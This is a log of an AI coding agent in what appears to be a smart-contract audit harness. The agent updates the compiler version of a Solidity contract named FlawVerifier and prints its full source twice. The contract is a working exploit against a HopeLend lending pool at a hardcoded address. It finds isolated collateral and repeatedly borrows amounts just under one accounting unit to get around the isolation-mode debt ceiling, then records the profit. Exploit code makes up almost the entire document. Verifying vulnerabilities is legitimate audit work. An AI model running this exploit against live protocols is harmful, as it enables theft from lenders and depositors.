+/bin/bash -lc 'find /Users/zhanglongqin/AuditHoundV2/cases/hopelend/src/onchain_auto/0x3a6d9bf8286a4ada77c15ecf82d4c0c0af95be74 -maxdepth 1 -type f | sort' in /Users/zhanglongqin/AuditHoundV2/cases/hopelend/src
+ succeeded in 0ms:
+/Users/zhanglongqin/AuditHoundV2/cases/hopelend/src/onchain_auto/0x3a6d9bf8286a4ada77c15ecf82d4c0c0af95be74/_etherscan_meta.json
+
+exec
+/bin/bash -lc "sed -n '1,260p' /Users/zhanglongqin/AuditHoundV2/cases/hopelend/src/onchain_auto/0x3a6d9bf8286a4ada77c15ecf82d4c0c0af95be74/storage_layout.json" in /Users/zhanglongqin/AuditHoundV2/cases/hopelend/src
+exec
+/bin/bash -lc "sed -n '1,260p' /Users/zhanglongqin/AuditHoundV2/cases/hopelend/src/onchain_auto/0x3a6d9bf8286a4ada77c15ecf82d4c0c0af95be74/abi.json" in /Users/zhanglongqin/AuditHoundV2/cases/hopelend/src
+ exited 1 in 0ms:
+sed: /Users/zhanglongqin/AuditHoundV2/cases/hopelend/src/onchain_auto/0x3a6d9bf8286a4ada77c15ecf82d4c0c0af95be74/abi.json: No such file or directory
+
+ exited 1 in 0ms:
+sed: /Users/zhanglongqin/AuditHoundV2/cases/hopelend/src/onchain_auto/0x3a6d9bf8286a4ada77c15ecf82d4c0c0af95be74/storage_layout.json: No such file or directory
+
+codex
+I have enough context. The concrete fix is narrow: update the file to `^0.8.20` and keep the exploit path logic intact so the harness can compile it against the test contract version.
+apply patch
+patch: completed
+/Users/zhanglongqin/AuditHoundV2/cases/hopelend/src/FlawVerifier.sol
+diff --git a/FlawVerifier.sol b/FlawVerifier.sol
+index 781029ea96e782c7b69fbc4994c815ff417ca642..b1862fd39344f82b47e358ffafe86b9d446c3fd3
+--- a/FlawVerifier.sol
++++ b/FlawVerifier.sol
+@@ -1,5 +1,5 @@
+ // SPDX-License-Identifier: MIT
+-pragma solidity 0.8.17;
++pragma solidity ^0.8.20;
+ 
+ interface IERC20Like {
+   function balanceOf(address account) external view returns (uint256);
+
+diff --git a/FlawVerifier.sol b/FlawVerifier.sol
+index 781029ea96e782c7b69fbc4994c815ff417ca642..b1862fd39344f82b47e358ffafe86b9d446c3fd3
+--- a/FlawVerifier.sol
++++ b/FlawVerifier.sol
+@@ -1,5 +1,5 @@
+ // SPDX-License-Identifier: MIT
+-pragma solidity 0.8.17;
++pragma solidity ^0.8.20;
+ 
+ interface IERC20Like {
+   function balanceOf(address account) external view returns (uint256);
+
+codex
+The edit is in place. I’m doing a direct syntax compile on the single file now to catch any 0.8.20 incompatibility before I return the full source.
+exec
+/bin/bash -lc 'solc --base-path /Users/zhanglongqin/AuditHoundV2/cases/hopelend --bin /Users/zhanglongqin/AuditHoundV2/cases/hopelend/src/FlawVerifier.sol' in /Users/zhanglongqin/AuditHoundV2/cases/hopelend/src
+ exited 127 in 0ms:
+/bin/bash: solc: command not found
+
+exec
+/bin/bash -lc "sed -n '1,260p' /Users/zhanglongqin/AuditHoundV2/cases/hopelend/src/FlawVerifier.sol" in /Users/zhanglongqin/AuditHoundV2/cases/hopelend/src
+ succeeded in 0ms:
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+  function balanceOf(address account) external view returns (uint256);
+
+  function approve(address spender, uint256 amount) external returns (bool);
+}
+
+struct ReserveConfigurationMap {
+  uint256 data;
+}
+
+struct ReserveData {
+  ReserveConfigurationMap configuration;
+  uint128 liquidityIndex;
+  uint128 currentLiquidityRate;
+  uint128 variableBorrowIndex;
+  uint128 currentVariableBorrowRate;
+  uint128 currentStableBorrowRate;
+  uint40 lastUpdateTimestamp;
+  uint16 id;
+  address hTokenAddress;
+  address stableDebtTokenAddress;
+  address variableDebtTokenAddress;
+  address interestRateStrategyAddress;
+  uint128 accruedToTreasury;
+  uint128 unbacked;
+  uint128 isolationModeTotalDebt;
+}
+
+interface IPoolLike {
+  function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
+
+  function borrow(
+    address asset,
+    uint256 amount,
+    uint256 interestRateMode,
+    uint16 referralCode,
+    address onBehalfOf
+  ) external;
+
+  function setUserUseReserveAsCollateral(address asset, bool useAsCollateral) external;
+
+  function getConfiguration(address asset) external view returns (ReserveConfigurationMap memory);
+
+  function getReserveData(address asset) external view returns (ReserveData memory);
+
+  function getReservesList() external view returns (address[] memory);
+}
+
+contract FlawVerifier {
+  IPoolLike internal constant POOL =
+    IPoolLike(0x53FbcADa1201A465740F2d64eCdF6FAC425f9030);
+
+  uint256 internal constant VARIABLE_RATE_MODE = 2;
+  uint256 internal constant ACTIVE_BIT = 56;
+  uint256 internal constant FROZEN_BIT = 57;
+  uint256 internal constant BORROWING_BIT = 58;
+  uint256 internal constant PAUSED_BIT = 60;
+  uint256 internal constant BORROWABLE_IN_ISOLATION_BIT = 61;
+  uint256 internal constant DECIMALS_BIT = 48;
+  uint256 internal constant DEBT_CEILING_BIT = 212;
+  uint256 internal constant DEBT_CEILING_MASK = (1 << 40) - 1;
+  uint256 internal constant MAX_SINGLE_TX_BORROW_LOOPS = 120;
+  uint256 internal constant LOOP_GAS_FLOOR = 500_000;
+
+  uint8 public constant REASON_NONE = 0;
+  uint8 public constant REASON_NO_ISOLATED_COLLATERAL = 1;
+  uint8 public constant REASON_NO_BORROWABLE_ISOLATION_ASSET = 2;
+  uint8 public constant REASON_SUB_UNIT_BORROW_NOT_POSSIBLE = 3;
+  uint8 public constant REASON_LIQUIDITY_BELOW_REMAINING_CEILING = 4;
+  uint8 public constant REASON_LOOP_COUNT_EXCEEDS_SINGLE_TX_GAS = 5;
+  uint8 public constant REASON_NO_DIRECT_COLLATERAL_AND_NOT_SELF_FUNDING = 6;
+  uint8 public constant REASON_BORROW_REVERTED_BEFORE_BYPASS = 7;
+
+  address private _profitToken;
+  uint256 private _profitAmount;
+
+  address public selectedCollateralAsset;
+  address public selectedDebtAsset;
+  uint256 public selectedCollateralBalance;
+  uint256 public selectedCollateralLtv;
+  uint256 public selectedDebtCeiling;
+  uint256 public selectedDebtDecimals;
+  uint256 public selectedDebtAssetLiquidity;
+  uint256 public accountingUnitRaw;
+  uint256 public borrowChunkRaw;
+  uint256 public trackedDebtBefore;
+  uint256 public trackedDebtAfter;
+  uint256 public remainingCeilingUnitsBefore;
+  uint256 public actualCeilingToBypassRaw;
+  uint256 public requiredBorrowLoops;
+  uint256 public executedBorrowLoops;
+  uint256 public actualBorrowedRaw;
+  uint8 public infeasibilityReason;
+  bool public hypothesisValidated;
+  bool public ceilingBypassed;
+
+  struct Opportunity {
+    address collateralAsset;
+    uint256 collateralBalance;
+    uint256 collateralLtv;
+    uint256 debtCeiling;
+    uint256 trackedDebt;
+    uint256 remainingCeilingUnits;
+    address debtAsset;
+    uint256 debtAssetLiquidity;
+    uint256 debtDecimals;
+  }
+
+  constructor() {}
+
+  function executeOnOpportunity() external {
+    _resetRunState();
+
+    Opportunity memory opportunity = _discoverOpportunity();
+    if (opportunity.collateralAsset == address(0)) {
+      infeasibilityReason = REASON_NO_ISOLATED_COLLATERAL;
+      return;
+    }
+    if (opportunity.debtAsset == address(0)) {
+      infeasibilityReason = REASON_NO_BORROWABLE_ISOLATION_ASSET;
+      return;
+    }
+
+    selectedCollateralAsset = opportunity.collateralAsset;
+    selectedDebtAsset = opportunity.debtAsset;
+    selectedCollateralBalance = opportunity.collateralBalance;
+    selectedCollateralLtv = opportunity.collateralLtv;
+    selectedDebtCeiling = opportunity.debtCeiling;
+    selectedDebtDecimals = opportunity.debtDecimals;
+    selectedDebtAssetLiquidity = opportunity.debtAssetLiquidity;
+    trackedDebtBefore = opportunity.trackedDebt;
+    remainingCeilingUnitsBefore = opportunity.remainingCeilingUnits;
+
+    if (opportunity.debtDecimals <= 2) {
+      infeasibilityReason = REASON_SUB_UNIT_BORROW_NOT_POSSIBLE;
+      return;
+    }
+
+    accountingUnitRaw = 10 ** (opportunity.debtDecimals - 2);
+    borrowChunkRaw = accountingUnitRaw - 1;
+    actualCeilingToBypassRaw = opportunity.remainingCeilingUnits == 0
+      ? 1
+      : opportunity.remainingCeilingUnits * accountingUnitRaw + 1;
+    requiredBorrowLoops = _ceilDiv(actualCeilingToBypassRaw, borrowChunkRaw);
+
+    if (opportunity.debtAssetLiquidity < actualCeilingToBypassRaw) {
+      // The path is kept strict to one borrowable-in-isolation asset. If that asset
+      // cannot even cover the remaining debt-ceiling headroom in real token units,
+      // the stated path cannot cross the configured ceiling at this fork.
+      infeasibilityReason = REASON_LIQUIDITY_BELOW_REMAINING_CEILING;
+      return;
+    }
+
+    if (requiredBorrowLoops > MAX_SINGLE_TX_BORROW_LOOPS) {
+      // Each loop is a full HopeLend borrow path. Crossing the ceiling requires
+      // roughly one borrow per remaining debt-ceiling cent, so large residual headroom
+      // becomes mechanically single-transaction-infeasible before economics matter.
+      infeasibilityReason = REASON_LOOP_COUNT_EXCEEDS_SINGLE_TX_GAS;
+      return;
+    }
+
+    if (opportunity.collateralBalance == 0) {
+      // The required path begins by supplying isolated collateral. With no verifier-held
+      // balance, the only realistic temporary-capital route would be flash-borrowing the
+      // collateral. That does not self-fund here: ordinary LTV checks remain active, so
+      // borrowing against flash-borrowed collateral can only unlock `ltv / 10000` of its
+      // own value, which cannot buy back 100% of the collateral to close the flashloan.
+      infeasibilityReason = REASON_NO_DIRECT_COLLATERAL_AND_NOT_SELF_FUNDING;
+      return;
+    }
+
+    _runDirectPath(opportunity);
+  }
+
+  function profitToken() external view returns (address) {
+    return _profitToken;
+  }
+
+  function profitAmount() external view returns (uint256) {
+    return _profitAmount;
+  }
+
+  function _runDirectPath(Opportunity memory opportunity) internal {
+    uint256 startingDebtAssetBalance = IERC20Like(opportunity.debtAsset).balanceOf(address(this));
+
+    _safeApprove(opportunity.collateralAsset, address(POOL), opportunity.collateralBalance);
+    POOL.supply(opportunity.collateralAsset, opportunity.collateralBalance, address(this), 0);
+
+    // Keep the path explicit: the verifier supplies isolated collateral and uses it as collateral.
+    try POOL.setUserUseReserveAsCollateral(opportunity.collateralAsset, true) {} catch {}
+
+    for (
+      uint256 i = 0;
+      i < requiredBorrowLoops && gasleft() > LOOP_GAS_FLOOR;
+      ++i
+    ) {
+      (bool ok, ) = address(POOL).call(
+        abi.encodeWithSelector(
+          IPoolLike.borrow.selector,
+          opportunity.debtAsset,
+          borrowChunkRaw,
+          VARIABLE_RATE_MODE,
+          0,
+          address(this)
+        )
+      );
+      if (!ok) {
+        break;
+      }
+      ++executedBorrowLoops;
+      actualBorrowedRaw += borrowChunkRaw;
+      if (actualBorrowedRaw >= actualCeilingToBypassRaw) {
+        break;
+      }
+    }
+
+    trackedDebtAfter = POOL.getReserveData(opportunity.collateralAsset).isolationModeTotalDebt;
+    uint256 endingDebtAssetBalance = IERC20Like(opportunity.debtAsset).balanceOf(address(this));
+
+    ceilingBypassed =
+      actualBorrowedRaw >= actualCeilingToBypassRaw &&
+      trackedDebtAfter == trackedDebtBefore;
+    hypothesisValidated = ceilingBypassed;
+
+    if (ceilingBypassed && endingDebtAssetBalance > startingDebtAssetBalance) {
+      _profitToken = opportunity.debtAsset;
+      _profitAmount = endingDebtAssetBalance - startingDebtAssetBalance;
+      return;
+    }
+
+    infeasibilityReason = REASON_BORROW_REVERTED_BEFORE_BYPASS;
+  }
+
+  function _discoverOpportunity() internal view returns (Opportunity memory best) {
+    address[] memory reserves = POOL.getReservesList();
+
+    Opportunity memory bestWithBalance;
+    Opportunity memory bestWithoutBalance;
+    uint256 bestBorrowLiquidity;
+    address bestBorrowAsset;
+    uint256 bestBorrowDecimals;
+
+    for (uint256 i = 0; i < reserves.length; ++i) {
+      address asset = reserves[i];
+      ReserveData memory reserveData = POOL.getReserveData(asset);
+      uint256 configData = reserveData.configuration.data;
+
+      if (_isUsableBorrowableIsolationAsset(configData)) {
+        uint256 decimals = _decimals(configData);
+        if (decimals > 2) {
+          uint256 liquidity = IERC20Like(asset).balanceOf(reserveData.hTokenAddress);
+          if (liquidity > bestBorrowLiquidity) {
+            bestBorrowLiquidity = liquidity;
+            bestBorrowAsset = asset;
+            bestBorrowDecimals = decimals;
+          }
+        }
+
+diff --git a/FlawVerifier.sol b/FlawVerifier.sol
+index 781029ea96e782c7b69fbc4994c815ff417ca642..b1862fd39344f82b47e358ffafe86b9d446c3fd3
+--- a/FlawVerifier.sol
++++ b/FlawVerifier.sol
+@@ -1,5 +1,5 @@
+ // SPDX-License-Identifier: MIT
+-pragma solidity 0.8.17;
++pragma solidity ^0.8.20;
+ 
+ interface IERC20Like {
+   function balanceOf(address account) external view returns (uint256);
+
+codex
+`solc` isn’t installed in this sandbox, so I can only do a source-level check. I’m reading the remainder of the file once to ensure I return the exact full updated contract.
+exec
+/bin/bash -lc "sed -n '261,520p' /Users/zhanglongqin/AuditHoundV2/cases/hopelend/src/FlawVerifier.sol" in /Users/zhanglongqin/AuditHoundV2/cases/hopelend/src
+ succeeded in 0ms:
+      }
+
+      if (_isUsableIsolatedCollateral(configData)) {
+        uint256 collateralBalance = IERC20Like(asset).balanceOf(address(this));
+        uint256 debtCeiling = _debtCeiling(configData);
+        uint256 trackedDebt = reserveData.isolationModeTotalDebt;
+        uint256 remainingCeilingUnits = debtCeiling > trackedDebt ? debtCeiling - trackedDebt : 0;
+
+        Opportunity memory candidate = Opportunity({
+          collateralAsset: asset,
+          collateralBalance: collateralBalance,
+          collateralLtv: _ltv(configData),
+          debtCeiling: debtCeiling,
+          trackedDebt: trackedDebt,
+          remainingCeilingUnits: remainingCeilingUnits,
+          debtAsset: address(0),
+          debtAssetLiquidity: 0,
+          debtDecimals: 0
+        });
+
+        if (collateralBalance > 0) {
+          if (
+            bestWithBalance.collateralAsset == address(0) ||
+            remainingCeilingUnits < bestWithBalance.remainingCeilingUnits
+          ) {
+            bestWithBalance = candidate;
+          }
+        } else if (
+          bestWithoutBalance.collateralAsset == address(0) ||
+          remainingCeilingUnits < bestWithoutBalance.remainingCeilingUnits
+        ) {
+          bestWithoutBalance = candidate;
+        }
+      }
+    }
+
+    best = bestWithBalance.collateralAsset != address(0) ? bestWithBalance : bestWithoutBalance;
+    if (best.collateralAsset != address(0) && bestBorrowAsset != address(0)) {
+      best.debtAsset = bestBorrowAsset;
+      best.debtAssetLiquidity = bestBorrowLiquidity;
+      best.debtDecimals = bestBorrowDecimals;
+    }
+  }
+
+  function _safeApprove(address token, address spender, uint256 amount) internal {
+    (bool ok, bytes memory data) = token.call(
+      abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount)
+    );
+    require(ok && (data.length == 0 || abi.decode(data, (bool))), "APPROVE_FAILED");
+  }
+
+  function _resetRunState() internal {
+    _profitToken = address(0);
+    _profitAmount = 0;
+    selectedCollateralAsset = address(0);
+    selectedDebtAsset = address(0);
+    selectedCollateralBalance = 0;
+    selectedCollateralLtv = 0;
+    selectedDebtCeiling = 0;
+    selectedDebtDecimals = 0;
+    selectedDebtAssetLiquidity = 0;
+    accountingUnitRaw = 0;
+    borrowChunkRaw = 0;
+    trackedDebtBefore = 0;
+    trackedDebtAfter = 0;
+    remainingCeilingUnitsBefore = 0;
+    actualCeilingToBypassRaw = 0;
+    requiredBorrowLoops = 0;
+    executedBorrowLoops = 0;
+    actualBorrowedRaw = 0;
+    infeasibilityReason = REASON_NONE;
+    hypothesisValidated = false;
+    ceilingBypassed = false;
+  }
+
+  function _isUsableIsolatedCollateral(uint256 configData) internal pure returns (bool) {
+    return
+      _flag(configData, ACTIVE_BIT) &&
+      !_flag(configData, FROZEN_BIT) &&
+      !_flag(configData, PAUSED_BIT) &&
+      _ltv(configData) > 0 &&
+      _debtCeiling(configData) > 0;
+  }
+
+  function _isUsableBorrowableIsolationAsset(uint256 configData) internal pure returns (bool) {
+    return
+      _flag(configData, ACTIVE_BIT) &&
+      !_flag(configData, FROZEN_BIT) &&
+      !_flag(configData, PAUSED_BIT) &&
+      _flag(configData, BORROWING_BIT) &&
+      _flag(configData, BORROWABLE_IN_ISOLATION_BIT);
+  }
+
+  function _flag(uint256 configData, uint256 bit) internal pure returns (bool) {
+    return ((configData >> bit) & 1) != 0;
+  }
+
+  function _ltv(uint256 configData) internal pure returns (uint256) {
+    return configData & 0xFFFF;
+  }
+
+  function _decimals(uint256 configData) internal pure returns (uint256) {
+    return (configData >> DECIMALS_BIT) & 0xFF;
+  }
+
+  function _debtCeiling(uint256 configData) internal pure returns (uint256) {
+    return (configData >> DEBT_CEILING_BIT) & DEBT_CEILING_MASK;
+  }
+
+  function _ceilDiv(uint256 x, uint256 y) internal pure returns (uint256) {
+    return x == 0 ? 0 : ((x - 1) / y) + 1;
+  }
+}
+
+diff --git a/FlawVerifier.sol b/FlawVerifier.sol
+index 781029ea96e782c7b69fbc4994c815ff417ca642..b1862fd39344f82b47e358ffafe86b9d446c3fd3
+--- a/FlawVerifier.sol
++++ b/FlawVerifier.sol
+@@ -1,5 +1,5 @@
+ // SPDX-License-Identifier: MIT
+-pragma solidity 0.8.17;
++pragma solidity ^0.8.20;
+ 
+ interface IERC20Like {
+   function balanceOf(address account) external view returns (uint256);
+
+codex
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+  function balanceOf(address account) external view returns (uint256);
+
+  function approve(address spender, uint256 amount) external returns (bool);
+}
+
+struct ReserveConfigurationMap {
+  uint256 data;
+}
+
+struct ReserveData {
+  ReserveConfigurationMap configuration;
+  uint128 liquidityIndex;
+  uint128 currentLiquidityRate;
+  uint128 variableBorrowIndex;
+  uint128 currentVariableBorrowRate;
+  uint128 currentStableBorrowRate;
+  uint40 lastUpdateTimestamp;
+  uint16 id;
+  address hTokenAddress;
+  address stableDebtTokenAddress;
+  address variableDebtTokenAddress;
+  address interestRateStrategyAddress;
+  uint128 accruedToTreasury;
+  uint128 unbacked;
+  uint128 isolationModeTotalDebt;
+}
+
+interface IPoolLike {
+  function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
+
+  function borrow(
+    address asset,
+    uint256 amount,
+    uint256 interestRateMode,
+    uint16 referralCode,
+    address onBehalfOf
+  ) external;
+
+  function setUserUseReserveAsCollateral(address asset, bool useAsCollateral) external;
+
+  function getConfiguration(address asset) external view returns (ReserveConfigurationMap memory);
+
+  function getReserveData(address asset) external view returns (ReserveData memory);
+
+  function getReservesList() external view returns (address[] memory);
+}
+
+contract FlawVerifier {
+  IPoolLike internal constant POOL =
+    IPoolLike(0x53FbcADa1201A465740F2d64eCdF6FAC425f9030);
+
+  uint256 internal constant VARIABLE_RATE_MODE = 2;
+  uint256 internal constant ACTIVE_BIT = 56;
+  uint256 internal constant FROZEN_BIT = 57;
+  uint256 internal constant BORROWING_BIT = 58;
+  uint256 internal constant PAUSED_BIT = 60;
+  uint256 internal constant BORROWABLE_IN_ISOLATION_BIT = 61;
+  uint256 internal constant DECIMALS_BIT = 48;
+  uint256 internal constant DEBT_CEILING_BIT = 212;
+  uint256 internal constant DEBT_CEILING_MASK = (1 << 40) - 1;
+  uint256 internal constant MAX_SINGLE_TX_BORROW_LOOPS = 120;
+  uint256 internal constant LOOP_GAS_FLOOR = 500_000;
+
+  uint8 public constant REASON_NONE = 0;
+  uint8 public constant REASON_NO_ISOLATED_COLLATERAL = 1;
+  uint8 public constant REASON_NO_BORROWABLE_ISOLATION_ASSET = 2;
+  uint8 public constant REASON_SUB_UNIT_BORROW_NOT_POSSIBLE = 3;
+  uint8 public constant REASON_LIQUIDITY_BELOW_REMAINING_CEILING = 4;
+  uint8 public constant REASON_LOOP_COUNT_EXCEEDS_SINGLE_TX_GAS = 5;
+  uint8 public constant REASON_NO_DIRECT_COLLATERAL_AND_NOT_SELF_FUNDING = 6;
+  uint8 public constant REASON_BORROW_REVERTED_BEFORE_BYPASS = 7;
+
+  address private _profitToken;
+  uint256 private _profitAmount;
+
+  address public selectedCollateralAsset;
+  address public selectedDebtAsset;
+  uint256 public selectedCollateralBalance;
+  uint256 public selectedCollateralLtv;
+  uint256 public selectedDebtCeiling;
+  uint256 public selectedDebtDecimals;
+  uint256 public selectedDebtAssetLiquidity;
+  uint256 public accountingUnitRaw;
+  uint256 public borrowChunkRaw;
+  uint256 public trackedDebtBefore;
+  uint256 public trackedDebtAfter;
+  uint256 public remainingCeilingUnitsBefore;
+  uint256 public actualCeilingToBypassRaw;
+  uint256 public requiredBorrowLoops;
+  uint256 public executedBorrowLoops;
+  uint256 public actualBorrowedRaw;
+  uint8 public infeasibilityReason;
+  bool public hypothesisValidated;
+  bool public ceilingBypassed;
+
+  struct Opportunity {
+    address collateralAsset;
+    uint256 collateralBalance;
+    uint256 collateralLtv;
+    uint256 debtCeiling;
+    uint256 trackedDebt;
+    uint256 remainingCeilingUnits;
+    address debtAsset;
+    uint256 debtAssetLiquidity;
+    uint256 debtDecimals;
+  }
+
+  constructor() {}
+
+  function executeOnOpportunity() external {
+    _resetRunState();
+
+    Opportunity memory opportunity = _discoverOpportunity();
+    if (opportunity.collateralAsset == address(0)) {
+      infeasibilityReason = REASON_NO_ISOLATED_COLLATERAL;
+      return;
+    }
+    if (opportunity.debtAsset == address(0)) {
+      infeasibilityReason = REASON_NO_BORROWABLE_ISOLATION_ASSET;
+      return;
+    }
+
+    selectedCollateralAsset = opportunity.collateralAsset;
+    selectedDebtAsset = opportunity.debtAsset;
+    selectedCollateralBalance = opportunity.collateralBalance;
+    selectedCollateralLtv = opportunity.collateralLtv;
+    selectedDebtCeiling = opportunity.debtCeiling;
+    selectedDebtDecimals = opportunity.debtDecimals;
+    selectedDebtAssetLiquidity = opportunity.debtAssetLiquidity;
+    trackedDebtBefore = opportunity.trackedDebt;
+    remainingCeilingUnitsBefore = opportunity.remainingCeilingUnits;
+
+    if (opportunity.debtDecimals <= 2) {
+      infeasibilityReason = REASON_SUB_UNIT_BORROW_NOT_POSSIBLE;
+      return;
+    }
+
+    accountingUnitRaw = 10 ** (opportunity.debtDecimals - 2);
+    borrowChunkRaw = accountingUnitRaw - 1;
+    actualCeilingToBypassRaw = opportunity.remainingCeilingUnits == 0
+      ? 1
+      : opportunity.remainingCeilingUnits * accountingUnitRaw + 1;
+    requiredBorrowLoops = _ceilDiv(actualCeilingToBypassRaw, borrowChunkRaw);
+
+    if (opportunity.debtAssetLiquidity < actualCeilingToBypassRaw) {
+      // The path is kept strict to one borrowable-in-isolation asset. If that asset
+      // cannot even cover the remaining debt-ceiling headroom in real token units,
+      // the stated path cannot cross the configured ceiling at this fork.
+      infeasibilityReason = REASON_LIQUIDITY_BELOW_REMAINING_CEILING;
+      return;
+    }
+
+    if (requiredBorrowLoops > MAX_SINGLE_TX_BORROW_LOOPS) {
+      // Each loop is a full HopeLend borrow path. Crossing the ceiling requires
+      // roughly one borrow per remaining debt-ceiling cent, so large residual headroom
+      // becomes mechanically single-transaction-infeasible before economics matter.
+      infeasibilityReason = REASON_LOOP_COUNT_EXCEEDS_SINGLE_TX_GAS;
+      return;
+    }
+
+    if (opportunity.collateralBalance == 0) {
+      // The required path begins by supplying isolated collateral. With no verifier-held
+      // balance, the only realistic temporary-capital route would be flash-borrowing the
+      // collateral. That does not self-fund here: ordinary LTV checks remain active, so
+      // borrowing against flash-borrowed collateral can only unlock `ltv / 10000` of its
+      // own value, which cannot buy back 100% of the collateral to close the flashloan.
+      infeasibilityReason = REASON_NO_DIRECT_COLLATERAL_AND_NOT_SELF_FUNDING;
+      return;
+    }
+
+    _runDirectPath(opportunity);
+  }
+
+  function profitToken() external view returns (address) {
+    return _profitToken;
+  }
+
+  function profitAmount() external view returns (uint256) {
+    return _profitAmount;
+  }
+
+  function _runDirectPath(Opportunity memory opportunity) internal {
+    uint256 startingDebtAssetBalance = IERC20Like(opportunity.debtAsset).balanceOf(address(this));
+
+    _safeApprove(opportunity.collateralAsset, address(POOL), opportunity.collateralBalance);
+    POOL.supply(opportunity.collateralAsset, opportunity.collateralBalance, address(this), 0);
+
+    // Keep the path explicit: the verifier supplies isolated collateral and uses it as collateral.
+    try POOL.setUserUseReserveAsCollateral(opportunity.collateralAsset, true) {} catch {}
+
+    for (
+      uint256 i = 0;
+      i < requiredBorrowLoops && gasleft() > LOOP_GAS_FLOOR;
+      ++i
+    ) {
+      (bool ok, ) = address(POOL).call(
+        abi.encodeWithSelector(
+          IPoolLike.borrow.selector,
+          opportunity.debtAsset,
+          borrowChunkRaw,
+          VARIABLE_RATE_MODE,
+          0,
+          address(this)
+        )
+      );
+      if (!ok) {
+        break;
+      }
+      ++executedBorrowLoops;
+      actualBorrowedRaw += borrowChunkRaw;
+      if (actualBorrowedRaw >= actualCeilingToBypassRaw) {
+        break;
+      }
+    }
+
+    trackedDebtAfter = POOL.getReserveData(opportunity.collateralAsset).isolationModeTotalDebt;
+    uint256 endingDebtAssetBalance = IERC20Like(opportunity.debtAsset).balanceOf(address(this));
+
+    ceilingBypassed =
+      actualBorrowedRaw >= actualCeilingToBypassRaw &&
+      trackedDebtAfter == trackedDebtBefore;
+    hypothesisValidated = ceilingBypassed;
+
+    if (ceilingBypassed && endingDebtAssetBalance > startingDebtAssetBalance) {
+      _profitToken = opportunity.debtAsset;
+      _profitAmount = endingDebtAssetBalance - startingDebtAssetBalance;
+      return;
+    }
+
+    infeasibilityReason = REASON_BORROW_REVERTED_BEFORE_BYPASS;
+  }
+
+  function _discoverOpportunity() internal view returns (Opportunity memory best) {
+    address[] memory reserves = POOL.getReservesList();
+
+    Opportunity memory bestWithBalance;
+    Opportunity memory bestWithoutBalance;
+    uint256 bestBorrowLiquidity;
+    address bestBorrowAsset;
+    uint256 bestBorrowDecimals;
+
+    for (uint256 i = 0; i < reserves.length; ++i) {
+      address asset = reserves[i];
+      ReserveData memory reserveData = POOL.getReserveData(asset);
+      uint256 configData = reserveData.configuration.data;
+
+      if (_isUsableBorrowableIsolationAsset(configData)) {
+        uint256 decimals = _decimals(configData);
+        if (decimals > 2) {
+          uint256 liquidity = IERC20Like(asset).balanceOf(reserveData.hTokenAddress);
+          if (liquidity > bestBorrowLiquidity) {
+            bestBorrowLiquidity = liquidity;
+            bestBorrowAsset = asset;
+            bestBorrowDecimals = decimals;
+          }
+        }
+      }
+
+      if (_isUsableIsolatedCollateral(configData)) {
+        uint256 collateralBalance = IERC20Like(asset).balanceOf(address(this));
+        uint256 debtCeiling = _debtCeiling(configData);
+        uint256 trackedDebt = reserveData.isolationModeTotalDebt;
+        uint256 remainingCeilingUnits = debtCeiling > trackedDebt ? debtCeiling - trackedDebt : 0;
+
+        Opportunity memory candidate = Opportunity({
+          collateralAsset: asset,
+          collateralBalance: collateralBalance,
+          collateralLtv: _ltv(configData),
+          debtCeiling: debtCeiling,
+          trackedDebt: trackedDebt,
+          remainingCeilingUnits: remainingCeilingUnits,
+          debtAsset: address(0),
+          debtAssetLiquidity: 0,
+          debtDecimals: 0
+        });
+
+        if (collateralBalance > 0) {
+          if (
+            bestWithBalance.collateralAsset == address(0) ||
+            remainingCeilingUnits < bestWithBalance.remainingCeilingUnits
+          ) {
+            bestWithBalance = candidate;
+          }
+        } else if (
+          bestWithoutBalance.collateralAsset == address(0) ||
+          remainingCeilingUnits < bestWithoutBalance.remainingCeilingUnits
+        ) {
+          bestWithoutBalance = candidate;
+        }
+      }
+    }
+
+    best = bestWithBalance.collateralAsset != address(0) ? bestWithBalance : bestWithoutBalance;
+    if (best.collateralAsset != address(0) && bestBorrowAsset != address(0)) {
+      best.debtAsset = bestBorrowAsset;
+      best.debtAssetLiquidity = bestBorrowLiquidity;
+      best.debtDecimals = bestBorrowDecimals;
+    }
+  }
+
+  function _safeApprove(address token, address spender, uint256 amount) internal {
+    (bool ok, bytes memory data) = token.call(
+      abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount)
+    );
+    require(ok && (data.length == 0 || abi.decode(data, (bool))), "APPROVE_FAILED");
+  }
+
+  function _resetRunState() internal {
+    _profitToken = address(0);
+    _profitAmount = 0;
+    selectedCollateralAsset = address(0);
+    selectedDebtAsset = address(0);
+    selectedCollateralBalance = 0;
+    selectedCollateralLtv = 0;
+    selectedDebtCeiling = 0;
+    selectedDebtDecimals = 0;
+    selectedDebtAssetLiquidity = 0;
+    accountingUnitRaw = 0;
+    borrowChunkRaw = 0;
+    trackedDebtBefore = 0;
+    trackedDebtAfter = 0;
+    remainingCeilingUnitsBefore = 0;
+    actualCeilingToBypassRaw = 0;
+    requiredBorrowLoops = 0;
+    executedBorrowLoops = 0;
+    actualBorrowedRaw = 0;
+    infeasibilityReason = REASON_NONE;
+    hypothesisValidated = false;
+    ceilingBypassed = false;
+  }
+
+  function _isUsableIsolatedCollateral(uint256 configData) internal pure returns (bool) {
+    return
+      _flag(configData, ACTIVE_BIT) &&
+      !_flag(configData, FROZEN_BIT) &&
+      !_flag(configData, PAUSED_BIT) &&
+      _ltv(configData) > 0 &&
+      _debtCeiling(configData) > 0;
+  }
+
+  function _isUsableBorrowableIsolationAsset(uint256 configData) internal pure returns (bool) {
+    return
+      _flag(configData, ACTIVE_BIT) &&
+      !_flag(configData, FROZEN_BIT) &&
+      !_flag(configData, PAUSED_BIT) &&
+      _flag(configData, BORROWING_BIT) &&
+      _flag(configData, BORROWABLE_IN_ISOLATION_BIT);
+  }
+
+  function _flag(uint256 configData, uint256 bit) internal pure returns (bool) {
+    return ((configData >> bit) & 1) != 0;
+  }
+
+  function _ltv(uint256 configData) internal pure returns (uint256) {
+    return configData & 0xFFFF;
+  }
+
+  function _decimals(uint256 configData) internal pure returns (uint256) {
+    return (configData >> DECIMALS_BIT) & 0xFF;
+  }
+
+  function _debtCeiling(uint256 configData) internal pure returns (uint256) {
+    return (configData >> DEBT_CEILING_BIT) & DEBT_CEILING_MASK;
+  }
+
